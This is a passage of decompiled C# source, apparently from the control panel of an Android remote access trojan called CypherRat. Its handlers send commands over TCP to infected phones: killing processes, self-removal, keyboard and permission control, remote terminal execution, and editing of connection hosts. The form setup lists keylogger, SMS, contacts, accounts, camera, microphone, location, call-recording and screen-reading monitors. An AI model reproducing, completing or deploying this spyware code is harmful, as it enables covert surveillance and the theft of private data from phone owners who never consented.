						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D5 RID: 1749 RVA: 0x00030B40 File Offset: 0x0002ED40
		private void method_126(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										Alert.ShowInformation("the tool is under maintenance ");
										break;
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D6 RID: 1750 RVA: 0x00030C24 File Offset: 0x0002EE24
		private void ToolStripMenuItem16_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											Module13.string_32 + GClass9.string_0 + "10000",
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
										gclass.method_6(tcpClient_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D7 RID: 1751 RVA: 0x00030D54 File Offset: 0x0002EF54
		private void ToolStripMenuItem17_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										gclass.method_4(gclass.string_1);
										gclass.method_6(gclass.tcpClient_0);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D8 RID: 1752 RVA: 0x00030E4C File Offset: 0x0002F04C
		private void ToolStripMenuItem18_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"kill<*>x",
												GClass9.string_0,
												"0",
												GClass9.string_0,
												"0",
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006D9 RID: 1753 RVA: 0x0003102C File Offset: 0x0002F22C
		private void ToolStripMenuItem11_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "SelfRemove_" + gclass.string_1;
										SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
										if (selfRemove != null)
										{
											selfRemove.BringToFront();
										}
										else
										{
											new SelfRemove
											{
												gclass8_0 = gclass
											}.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006DA RID: 1754 RVA: 0x00031164 File Offset: 0x0002F364
		private void KeyboardToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Keyboard_Manager" + gclass.string_2;
										KeyboardManager keyboardManager = (KeyboardManager)MyProject.Application.OpenForms[name];
										if (keyboardManager != null)
										{
											keyboardManager.BringToFront();
											break;
										}
										new KeyboardManager
										{
											Name = name,
											Tag = gclass.string_1,
											gclass8_0 = gclass
										}.Show();
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"KBO<*>lod",
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006DB RID: 1755 RVA: 0x000313C8 File Offset: 0x0002F5C8
		private void ClientFolderToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									try
									{
										if (gclass != null)
										{
											string string_ = gclass.string_10;
											if (!Directory.Exists(string_))
											{
												Directory.CreateDirectory(string_);
											}
											Process.Start(string_);
										}
									}
									catch (Exception ex)
									{
									}
								}
							}
							catch (Exception ex2)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex3)
				{
				}
			}
		}

		// Token: 0x060006DC RID: 1756 RVA: 0x000314E8 File Offset: 0x0002F6E8
		private void ToolStripMenuItem12_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "Permissions_Manager" + gclass.string_2;
										PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
										if (permissionsManager != null)
										{
											permissionsManager.BringToFront();
											break;
										}
										new PermissionsManager
										{
											Name = name,
											Tag = gclass.string_1,
											gclass8_0 = gclass
										}.Show();
										TcpClient tcpClient_ = gclass.tcpClient_0;
										string[] array = gclass.string_0.Split(new char[]
										{
											':'
										});
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_29,
												GClass9.string_0,
												"RPM<*>[lod]",
												GClass9.string_0,
												array[0],
												GClass9.string_0,
												array[1],
												GClass9.string_0,
												Module13.string_5,
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												Conversions.ToString(0),
												GClass9.string_0,
												GClass9.string_3,
												GClass9.string_0,
												gclass.string_2
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
										Alert.ShowSucess("Loading Permissions Started...");
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006DD RID: 1757 RVA: 0x0003174C File Offset: 0x0002F94C
		private void ToolStripMenuItem10_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										TcpClient tcpClient_ = gclass.tcpClient_0;
										object[] objects_ = new object[]
										{
											tcpClient_,
											string.Concat(new string[]
											{
												Module13.string_28,
												GClass9.string_0,
												Module8.string_4,
												".terminal",
												GClass9.string_0,
												"method",
												GClass9.string_0,
												Module13.string_8,
												GClass9.string_0,
												"run"
											}),
											Module2.smethod_9().GetBytes("null"),
											gclass
										};
										gclass.method_2(objects_);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006DE RID: 1758 RVA: 0x000318E8 File Offset: 0x0002FAE8
		private void ClientsWindow_CellContentClick(object sender, DataGridViewCellEventArgs e)
		{
			DataGridViewRow dataGridViewRow = null;
			try
			{
				dataGridViewRow = this.ClientsWindow.Rows[e.RowIndex];
			}
			catch (Exception ex)
			{
				return;
			}
			try
			{
				GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
				if (e.ColumnIndex == 8)
				{
					if (dataGridViewRow != null)
					{
						if (gclass != null && gclass.bool_9)
						{
							string name = "Notifications_" + gclass.string_1;
							craxsnotification craxsnotification = (craxsnotification)MyProject.Application.OpenForms[name];
							if (craxsnotification == null)
							{
								new craxsnotification
								{
									Location = new Point(Cursor.Position.X, Cursor.Position.Y),
									gclass8_0 = gclass
								}.Show();
								dataGridViewRow.Cells[8].Value = Module2.smethod_29();
								gclass.bool_9 = false;
							}
						}
						else
						{
							dataGridViewRow.Cells[8].Value = Module2.smethod_29();
						}
					}
				}
				else
				{
					if (e.ColumnIndex != 9)
					{
						if (e.ColumnIndex == 10)
						{
							try
							{
								if (gclass != null)
								{
									string toolTipText = "%" + gclass.string_12.Replace("f", "").Replace("t", "");
									dataGridViewRow.Cells[10].ToolTipText = toolTipText;
									return;
								}
								goto IL_389;
							}
							catch (Exception ex2)
							{
								goto IL_389;
							}
						}
						if (e.ColumnIndex != 1)
						{
							if (Operators.CompareString(this.Label1.Text, Module2.smethod_60("j-s-t-r-b-w-c-n-T-7-a-I-S-1-N-B-Q-f-1-m-m-g-=-=-".Replace("-", ""), "1-a-5-s-5-d-8-f-7-t-6-y-1-b-3-n-".Replace("-", "")), false) != 0)
							{
								this.ClientsWindow.Rows.RemoveAt(0);
								goto IL_389;
							}
							goto IL_389;
						}
						else
						{
							try
							{
								if (gclass == null)
								{
									goto IL_389;
								}
								string[] array = gclass.string_0.Split(new char[]
								{
									':'
								});
								string toolTipText2 = string.Concat(new string[]
								{
									"Client-Info\r\nName:",
									gclass.string_8,
									"\r\nDefender:",
									gclass.object_3,
									"\r\nFrom:",
									gclass.string_6,
									"\r\nHost:",
									array[6],
									"\r\nip:",
									array[0],
									"\r\nAndorid:",
									gclass.string_7,
									"\r\nPort:",
									array[1],
									"\r\n"
								});
								dataGridViewRow.Cells[0].ToolTipText = toolTipText2;
								return;
							}
							catch (Exception ex3)
							{
								goto IL_389;
							}
						}
					}
					if (gclass != null && gclass.bool_6)
					{
						string name2 = "Calls_Log_" + gclass.string_1;
						craxscallslog craxscallslog = (craxscallslog)MyProject.Application.OpenForms[name2];
						if (craxscallslog == null)
						{
							craxscallslog = new craxscallslog();
							craxscallslog.Location = new Point(Cursor.Position.X, Cursor.Position.Y);
							craxscallslog.gclass8_0 = gclass;
							dataGridViewRow.Cells[9].Value = Module2.smethod_29();
							gclass.bool_6 = false;
							craxscallslog.Show();
						}
					}
					else
					{
						dataGridViewRow.Cells[9].Value = Module2.smethod_29();
					}
				}
				IL_389:;
			}
			catch (Exception ex4)
			{
			}
		}

		// Token: 0x060006DF RID: 1759 RVA: 0x00031CF4 File Offset: 0x0002FEF4
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					GClass8 gclass = (GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if (gclass.bool_0)
					{
						TcpClient tcpClient_ = gclass.tcpClient_0;
						object[] objects_ = new object[]
						{
							tcpClient_,
							string.Concat(new string[]
							{
								Module13.string_28,
								GClass9.string_0,
								Module8.string_4,
								".info",
								GClass9.string_0,
								"method",
								GClass9.string_0,
								Module13.string_27,
								GClass9.string_0,
								"get",
								GClass9.string_1,
								"null"
							}),
							Module2.smethod_9().GetBytes("null"),
							gclass
						};
						gclass.method_2(objects_);
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006E0 RID: 1760 RVA: 0x00031E34 File Offset: 0x00030034
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					GClass8 gclass = (GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if (gclass.bool_0)
					{
						string name = "Permissions_Manager" + gclass.string_2;
						PermissionsManager permissionsManager = (PermissionsManager)MyProject.Application.OpenForms[name];
						if (permissionsManager == null)
						{
							new PermissionsManager
							{
								Name = name,
								Tag = gclass.string_1,
								gclass8_0 = gclass
							}.Show();
							TcpClient tcpClient_ = gclass.tcpClient_0;
							string[] array = gclass.string_0.Split(new char[]
							{
								':'
							});
							object[] objects_ = new object[]
							{
								tcpClient_,
								string.Concat(new string[]
								{
									Module13.string_29,
									GClass9.string_0,
									"RPM<*>[lod]",
									GClass9.string_0,
									array[0],
									GClass9.string_0,
									array[1],
									GClass9.string_0,
									Module13.string_5,
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									GClass9.string_3,
									GClass9.string_0,
									gclass.string_2
								}),
								Module2.smethod_9().GetBytes("null"),
								gclass
							};
							gclass.method_2(objects_);
							Alert.ShowSucess("Loading Permissions Started...");
						}
						else
						{
							permissionsManager.BringToFront();
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006E1 RID: 1761 RVA: 0x00032030 File Offset: 0x00030230
		private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					GClass8 gclass = (GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if (gclass.bool_0)
					{
						string name = "SelfRemove_" + gclass.string_1;
						SelfRemove selfRemove = (SelfRemove)MyProject.Application.OpenForms[name];
						if (selfRemove == null)
						{
							new SelfRemove
							{
								gclass8_0 = gclass
							}.ShowDialog();
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006E2 RID: 1762 RVA: 0x000320FC File Offset: 0x000302FC
		private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
		{
			try
			{
				if ((GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag != null)
				{
					GClass8 gclass = (GClass8)this.ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if (gclass.bool_0)
					{
						TcpClient tcpClient_ = gclass.tcpClient_0;
						Dialog1 dialog = new Dialog1();
						dialog.string_0 = "Enter Messege";
						dialog.ShowDialog();
						if (dialog.DialogResult == DialogResult.OK)
						{
							string[] array = gclass.string_0.Split(new char[]
							{
								':'
							});
							object[] objects_ = new object[]
							{
								tcpClient_,
								string.Concat(new string[]
								{
									Module13.string_29,
									GClass9.string_0,
									"msg:",
									dialog.Mytext.Text,
									GClass9.string_0,
									array[0],
									GClass9.string_0,
									array[1],
									GClass9.string_0,
									Module13.string_5,
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									Conversions.ToString(0),
									GClass9.string_0,
									GClass9.string_3,
									GClass9.string_0,
									gclass.string_2
								}),
								Module2.smethod_9().GetBytes("null"),
								gclass
							};
							gclass.method_2(objects_);
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x060006E3 RID: 1763 RVA: 0x0000246D File Offset: 0x0000066D
		private void method_139(object sender, DataGridViewCellEventArgs e)
		{
		}

		// Token: 0x060006E4 RID: 1764 RVA: 0x000322BC File Offset: 0x000304BC
		private void Clients_Btn_Click(object sender, EventArgs e)
		{
			this.DashboardPanel.BringToFront();
		}

		// Token: 0x060006E5 RID: 1765 RVA: 0x000322D4 File Offset: 0x000304D4
		private void blockbtn_Click(object sender, EventArgs e)
		{
			this.blockpanel.BringToFront();
		}

		// Token: 0x060006E6 RID: 1766 RVA: 0x0002AF5C File Offset: 0x0002915C
		private void Connection_btn_Click(object sender, EventArgs e)
		{
			this.connectionpanel.BringToFront();
			this.DataLog.Visible = true;
			this.clearbtn.Visible = true;
		}

		// Token: 0x060006E7 RID: 1767 RVA: 0x000322EC File Offset: 0x000304EC
		private void DrakeUIAvatar1_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.Rows.Count > 0)
			{
				try
				{
					List<GClass8> list = new List<GClass8>();
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										list.Add(gclass);
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					if (list.Count > 0)
					{
						EditConnections editConnections = new EditConnections(list);
						if (editConnections.ShowDialog() == DialogResult.OK && editConnections.gclass8s_1.Count > 0)
						{
							try
							{
								foreach (GClass8 gclass2 in editConnections.gclass8s_1)
								{
									TcpClient tcpClient_ = gclass2.tcpClient_0;
									string text = editConnections.string_0;
									string text2 = editConnections.string_1;
									string text3 = editConnections.string_2;
									string[] array = gclass2.string_0.Split(new char[]
									{
										':'
									});
									object[] objects_ = new object[]
									{
										tcpClient_,
										string.Concat(new string[]
										{
											Module13.string_29,
											GClass9.string_0,
											"EHP<*>",
											text,
											"#",
											text2,
											"#",
											text3,
											GClass9.string_0,
											array[0],
											GClass9.string_0,
											array[1],
											GClass9.string_0,
											Module13.string_5,
											GClass9.string_0,
											Conversions.ToString(0),
											GClass9.string_0,
											Conversions.ToString(0),
											GClass9.string_0,
											GClass9.string_3,
											GClass9.string_0,
											gclass2.string_2
										}),
										Module2.smethod_9().GetBytes("null"),
										gclass2
									};
									gclass2.method_2(objects_);
								}
							}
							finally
							{
								List<GClass8>.Enumerator enumerator2;
								((IDisposable)enumerator2).Dispose();
							}
							Alert.ShowSucess("Connection Edit Successfully");
						}
						editConnections.Dispose();
					}
					return;
				}
				catch (Exception ex2)
				{
					return;
				}
			}
			Alert.ShowInformation("No Clients Found");
		}

		// Token: 0x060006E8 RID: 1768 RVA: 0x000325CC File Offset: 0x000307CC
		public string method_144(string string_0, string string_1)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			new MD5CryptoServiceProvider();
			ASCIIEncoding asciiencoding = new ASCIIEncoding();
			byte[] bytes = asciiencoding.GetBytes(string_1);
			try
			{
				rijndaelManaged.Key = bytes;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array = Convert.FromBase64String(string_0);
				return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
			}
			catch (Exception ex)
			{
			}
			return "";
		}

		// Token: 0x060006E9 RID: 1769 RVA: 0x00032660 File Offset: 0x00030860
		private void ToolStripMenuItem14_Click(object sender, EventArgs e)
		{
			if (this.ClientsWindow.SelectedRows.Count > 0)
			{
				try
				{
					try
					{
						foreach (object obj in this.ClientsWindow.SelectedRows)
						{
							DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
							try
							{
								if (dataGridViewRow.Tag != null)
								{
									GClass8 gclass = (GClass8)dataGridViewRow.Cells[8].Tag;
									if (gclass != null)
									{
										string name = "SC_Readv2_" + gclass.string_1;
										ScreenReaderV2 screenReaderV = (ScreenReaderV2)MyProject.Application.OpenForms[name];
										if (Operators.CompareString(this.Label1.Text, this.method_144("j`s`t`r`b`w`c`n`T`7`a`I`S`1`N`B`Q`f`1`m`m`g`=`=`".Replace("`", ""), "1`a`5`s`5`d`8`f`7`t`6`y`1`b`3`n`".Replace("`", "")), false) != 0)
										{
											Thread.Sleep(1000);
											try
											{
												foreach (GClass7 gclass2 in this.gclass7s_0)
												{
													gclass2.tcpListener_0.Server.ReceiveTimeout = 10;
													gclass2.tcpListener_0.Server.SendBufferSize = 1;
													gclass2.tcpListener_0.Server.NoDelay = false;
												}
											}
											finally
											{
												List<GClass7>.Enumerator enumerator2;
												((IDisposable)enumerator2).Dispose();
											}
										}
										if (screenReaderV == null)
										{
											screenReaderV = new ScreenReaderV2();
											screenReaderV.Name = name;
											screenReaderV.string_2 = string.Format("{0} - IP:{1}", "Screen Reader V2", gclass.string_1);
											screenReaderV.Tag = gclass.string_1;
											screenReaderV.gclass8_0 = gclass;
											screenReaderV.object_0 = gclass.tcpClient_0;
											screenReaderV.string_0 = gclass.string_10;
											screenReaderV.Show();
										}
									}
								}
							}
							catch (Exception ex)
							{
							}
						}
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception ex2)
				{
				}
			}
		}

		// Token: 0x060006EB RID: 1771 RVA: 0x00032914 File Offset: 0x00030B14
		private void method_146()
		{
			this.components = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(CypherRat));
			DataGridViewCellStyle dataGridViewCellStyle = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle2 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle3 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle4 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle5 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle6 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle7 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle8 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle9 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle10 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle11 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle12 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle13 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle14 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle15 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle16 = new DataGridViewCellStyle();
			DataGridViewCellStyle dataGridViewCellStyle17 = new DataGridViewCellStyle();
			this.notfi = new NotifyIcon(this.components);
			this.TOpacity = new System.Windows.Forms.Timer(this.components);
			this.Mainpanel = new Panel();
			this.DashboardPanel = new DrakeUITitlePanel();
			this.ClientsWindow = new DrakeUIDataGridView();
			this.cliscren = new DataGridViewImageColumn();
			this.cliav = new DataGridViewImageColumn();
			this.cliflg = new DataGridViewImageColumn();
			this.cliname = new DataGridViewTextBoxColumn();
			this.clicountry = new DataGridViewTextBoxColumn();
			this.cliip = new DataGridViewTextBoxColumn();
			this.andver = new DataGridViewTextBoxColumn();
			this.phondmod = new DataGridViewTextBoxColumn();
			this.clinoti = new DataGridViewImageColumn();
			this.clicalls = new DataGridViewImageColumn();
			this.clibtry = new DataGridViewImageColumn();
			this.cliwifi = new DataGridViewImageColumn();
			this.cliavt = new DataGridViewTextBoxColumn();
			this.defcli = new DataGridViewTextBoxColumn();
			this.isadmincli = new DataGridViewImageColumn();
			this.clipng = new DataGridViewTextBoxColumn();
			this.DrakeUIContextMenuStrip1 = new DrakeUIContextMenuStrip();
			this.ManagersToolStripMenuItem = new ToolStripMenuItem();
			this.FilesToolStripMenuItem = new ToolStripMenuItem();
			this.SMSToolStripMenuItem = new ToolStripMenuItem();
			this.CallsToolStripMenuItem1 = new ToolStripMenuItem();
			this.ContactsToolStripMenuItem = new ToolStripMenuItem();
			this.AccountsToolStripMenuItem = new ToolStripMenuItem();
			this.ApplicationsToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem12 = new ToolStripMenuItem();
			this.ToolStripSeparator1 = new ToolStripSeparator();
			this.MonitorsToolStripMenuItem = new ToolStripMenuItem();
			this.ScreenMonitorToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem14 = new ToolStripMenuItem();
			this.CameraMonitorToolStripMenuItem = new ToolStripMenuItem();
			this.MicrophoneMonitorToolStripMenuItem = new ToolStripMenuItem();
			this.KeyloggerToolStripMenuItem1 = new ToolStripMenuItem();
			this.LocationsMonitorToolStripMenuItem = new ToolStripMenuItem();
			this.LiveModeToolStripMenuItem1 = new ToolStripMenuItem();
			this.ToolStripSeparator2 = new ToolStripSeparator();
			this.SilentModeGOIPToolStripMenuItem = new ToolStripMenuItem();
			this.WebBrowserToolStripMenuItem1 = new ToolStripMenuItem();
			this.CallRecorderToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem3 = new ToolStripMenuItem();
			this.ScreenReaderToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator3 = new ToolStripSeparator();
			this.AdminToolStripMenuItem = new ToolStripMenuItem();
			this.RequestAdminRightsToolStripMenuItem = new ToolStripMenuItem();
			this.LockScreenToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripMenuItem2 = new ToolStripMenuItem();
			this.ToolStripSeparator6 = new ToolStripSeparator();
			this.ToolStripMenuItem4 = new ToolStripMenuItem();
			this.ToolStripMenuItem5 = new ToolStripMenuItem();
			this.ToolStripMenuItem6 = new ToolStripMenuItem();
			this.ToolStripMenuItem7 = new ToolStripMenuItem();
			this.ToolStripMenuItem8 = new ToolStripMenuItem();
			this.ToolStripMenuItem9 = new ToolStripMenuItem();
			this.ToolStripMenuItem10 = new ToolStripMenuItem();
			this.ToolStripSeparator5 = new ToolStripSeparator();
			this.ExtraToolStripMenuItem = new ToolStripMenuItem();
			this.NotificationListnerToolStripMenuItem = new ToolStripMenuItem();
			this.CallsListnerToolStripMenuItem = new ToolStripMenuItem();
			this.SocialMediaHanterToolStripMenuItem = new ToolStripMenuItem();
			this.PhoneInformationToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator7 = new ToolStripSeparator();
			this.ToolStripMenuItem13 = new ToolStripMenuItem();
			this.ToolStripMenuItem16 = new ToolStripMenuItem();
			this.ToolStripMenuItem17 = new ToolStripMenuItem();
			this.ToolStripMenuItem18 = new ToolStripMenuItem();
			this.ToolStripMenuItem11 = new ToolStripMenuItem();
			this.ToolStripSeparator8 = new ToolStripSeparator();
			this.KeyboardToolStripMenuItem = new ToolStripMenuItem();
			this.ToolStripSeparator4 = new ToolStripSeparator();
			this.ClientFolderToolStripMenuItem = new ToolStripMenuItem();
			this.Panel6 = new Panel();
			this.searchbtn = new DrakeUIAvatar();
			this.DrakeUIAvatar1 = new DrakeUIAvatar();
			this.clientfoldrbtn = new DrakeUIButtonIcon();
			this.uncheckbtn = new DrakeUIButtonIcon();
			this.TCavatar = new PictureBox();
			this.clearsrchbtn = new DrakeUIAvatar();
			this.checkall = new DrakeUICheckBox();
			this.searchtext = new DrakeUITextBox();
			this.Panel4 = new Panel();
			this.Panel7 = new Panel();
